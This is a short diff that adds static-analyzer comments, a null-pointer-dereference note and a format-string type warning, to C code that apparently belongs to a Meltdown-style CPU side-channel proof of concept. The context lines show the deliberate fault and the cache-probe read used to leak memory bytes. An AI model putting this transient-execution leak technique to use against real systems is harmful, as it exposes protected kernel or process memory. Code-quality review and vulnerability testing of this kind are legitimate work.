@@ -101,7 +101,7 @@ meltdown(int round, uint8_t *addr)
 		/*
 		 * Raise exception ...
 		 */
-		*((volatile int *)NULL) = 42;
+		*((volatile int *)NULL) = 42; /* Null pointer dereference !!! (volatile int*)NULL [nullPointer] */
 
 		/*
 		 * NOTREACHED
@@ -122,7 +122,7 @@ meltdown_test(int round, uint8_t *addr)
 {
 	junk = strlen(meltdown_pattern);
 	if (!sigsetjmp(buf, 1)) {
-		*((volatile int *)NULL) = 42;
+		*((volatile int *)NULL) = 42; /* Null pointer dereference !!! (volatile int*)NULL [nullPointer] */
 		/*NOTREACHED*/
 		junk = blocks[(*(addr)) * blocksize];
 	}
@@ -330,10 +330,11 @@ probability(enum vuln vuln, int kernel, int maxlen)
 				printf("Alternatives at offset %d:", n);
 				for (i = 0; i < VALUES_PER_BYTE; i++) {
 					if (cachehits[i])
-						printf(" 0x%02x (%c, n=%u)", i,
+						/* %u in format string (no. 3) requires 'unsigned int' 
+						but the argument type is 'int' */
+						printf(" 0x%02x (%c, n=%u)", i, 
 						    isprint(i) ? i : '.',
 						    cachehits[i]);
-
 				}
 			}
 		}
